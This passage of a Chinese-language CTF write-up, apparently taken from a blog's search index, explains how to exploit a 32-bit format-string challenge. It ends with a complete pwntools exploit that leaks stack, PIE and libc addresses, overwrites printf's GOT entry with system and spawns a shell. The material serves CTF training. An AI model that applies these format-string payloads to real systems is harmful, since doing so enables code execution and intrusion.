class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">payload=<span class="string">b&#x27;%6$p%11$pbbb&#x27;</span>+p32(system)+<span class="string">b&#x27;fake&#x27;</span>+p32(bin_sh)</span><br><span class="line">createcontact(<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,payload)</span><br><span class="line">printcontact()</span><br><span class="line">ru(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">data=ru(<span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=data.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[<span class="number">2</span>], <span class="number">16</span>)+<span class="number">12</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp_addr)</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(heap_addr-<span class="number">4</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;3333&#x27;</span>, <span class="string">b&#x27;123456789&#x27;</span>, <span class="string">b&#x27;300&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二种方法-顺藤摸瓜修改栈上合适地址，改写got"><a href="#第二种方法-顺藤摸瓜修改栈上合适地址，改写got" class="headerlink" title="第二种方法 顺藤摸瓜修改栈上合适地址，改写got"></a>第二种方法 顺藤摸瓜修改栈上合适地址，改写got</h2><p>题目链接：<a href="https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw">https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw</a><br>提取码：qydx</p><h3 id="拿到题目运行-1"><a href="#拿到题目运行-1" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212181525295.png" alt="image-20230212181525295"></p><h3 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212181617961.png" alt="image-20230212181617961"></p><h3 id="ida反汇编静态分析"><a href="#ida反汇编静态分析" class="headerlink" title="ida反汇编静态分析"></a>ida反汇编静态分析</h3><p><img src="/2023/02/12/pwn/image-20230212181703467.png" alt="image-20230212181703467"></p><p>很明显的漏洞，发现buf在.bss段，同样不在栈区(.bss:未初始化的全局和静态C变量，以及所有被初始化为0的全局或静态变量。(目标文件该节在磁盘不占空间，在运行时，内存分配，初始化0))</p><p><img src="/2023/02/12/pwn/image-20230212181831825.png" alt="image-20230212181831825"></p><p>同样无法直接利用fmtstr_payload利用，这次我们观察程序发现这次程序在我们再次到底可控参数的printf没有使用printf，可以修改printf got为system地址，从而利用可控参数，拿到shell，由于可控参数在.bss段，我们就需要利用可控参数在原有栈的数据上做文章</p><h3 id="gdb动态调试"><a href="#gdb动态调试" class="headerlink" title="gdb动态调试"></a>gdb动态调试</h3><p>输入%p后断点断到printf栈区如下</p><p><img src="/2023/02/12/pwn/image-20230212184115485.png" alt="image-20230212184115485"></p><p>利用1处栈地址，也就是将0xffffcfa8地址处内容0xffffcfb8修改为0xffffcfac，由于开启pie保护，0xffffcfac处所存内容是elf文件所存地址+pie基址生成的，got表也在elf文件的数据区，也是有地址+pie基地址生成，所以我们只需要利用%$hn修改其低四位即可(小端序)，buf地址可以利用%$p泄露，这样我们就可以输入buf为printf_got+payload，修改其got为system地址</p><h3 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h3><ol><li><p>%p%6$p泄露buf和ebp基地址</p></li><li><p>ebp基地址+偏移得到可修改的有价值地址</p></li><li><p>b’%’+str((ebp基地址+偏移)&amp;0xffff).encode()+b’c’+b’%6$hn’修改ebp指向地址</p></li><li><p>由于开启pie，需要先利用main返回地址泄露pie基地址，从而得到printf_got真实地址  %11$p</p></li><li><p>b’%’+str(printf_got&amp;0xffff).encode()+b’c’+b’%10$hn’改写有价值的地址为printf_got</p></li><li><p>%11$s\x00 利用布置好的printf_got泄露printf函数在libc里的真实地址 从而dump到system地址</p></li><li><p>改写printf_got为内容为system地址</p><p><img src="/2023/02/12/pwn/image-20230212185436302.png" alt="image-20230212185436302"></p></li><li><p>由于两地址有3个字节的差异，一次%$hn只能改写2字节内容，而改写四字节内容需要的输出代价太大，我们需要在栈上找到另一个有价值的地址重复上面1.2.3.5步骤进行改写，改写其为printf_got地址的后两字节地址</p></li><li><p>接下来就可以构造常规payload改写got达到目的</p></li></ol><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt_str_level_2_x86&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x130A)&#x27;)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;%p%6$p&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;hello\n&#x27;</span>,payload)</span><br><span class="line">addr=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr=addr.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base1=<span class="built_in">int</span>(addr[<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(addr[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;base1&#x27;</span>,base1)</span><br><span class="line">p(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">base2=base1+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(base2&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%11$p\x00&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)-elf.symbols[<span class="string">&#x27;main&#x27;</span>]-<span class="number">30</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_got+=pie</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf addr</span></span><br><span class="line">sl(<span class="string">b&#x27;%11$s\x00&#x27;</span>)</span><br><span class="line">printf_addr=u32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">base=printf_addr-libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change base1-4 ---7</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((base1-<span class="number">0xc</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got&amp;<span class="number">0xffff</span>)+<span class="number">2</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sysl=system_addr&amp;<span class="number">0xffff</span></span><br><span class="line">sysh=(system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%11$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysh-sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%7$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">r(sysl+sysh)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总结：一定还有其他姿势拿到shell，只是我们懂得太少不知道罢了Zzz</p>]]></content>
      
      
      
        <tags>
            
            <tag> Fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
